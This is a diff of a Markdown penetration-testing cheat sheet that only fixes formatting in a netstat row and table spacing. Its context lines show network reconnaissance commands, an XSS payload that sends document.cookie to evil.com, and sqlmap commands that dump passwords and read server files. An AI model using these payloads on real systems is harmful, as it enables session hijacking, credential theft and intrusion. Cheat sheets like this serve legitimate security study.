@@ -30,7 +30,7 @@
 | netstat –nabo | Lists ports / connections with corresponding process \(-b\), don’t perform looking \(-n\), all connections \(-a\) and owning process ID \(-o\) |
 | netstat –r | Displays the routing table |
 |  |  |
-| 'netstat -anob \| findstr “services, process or port”' | The “b” flag makes the command take longer but will output the process name using each of the connections. |
+| `netstat -anob | findstr “services, process or port”` | The “b” flag makes the command take longer but will output the process name using each of the connections. |
 | netsh diag show all | {**XP only**} Shows information on network services and adapters |
 | net view | Queries NBNS/SMB \(SAMBA\) and tries to find all hosts in your current workgroup or domain. |
 | net view /domain | List all domains available to the host |
@@ -104,7 +104,7 @@
 | :--- | :--- |
 | document.write\('&lt;img src="[http://evil.com/x.gif?cookie=](http://evil.com/x.gif?cookie=)' + document.cookie + '" /&gt;\) | XSS steal cookie |
 | sqlmap -u &lt;target&gt; -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/test.php" | Targeted scan |
-| sqlmap -u[http://example.com](http://example.com/)--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3 |    |
+| sqlmap -u[http://example.com](http://example.com/)--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3 |  |
 
 **METASPLOIT**
 
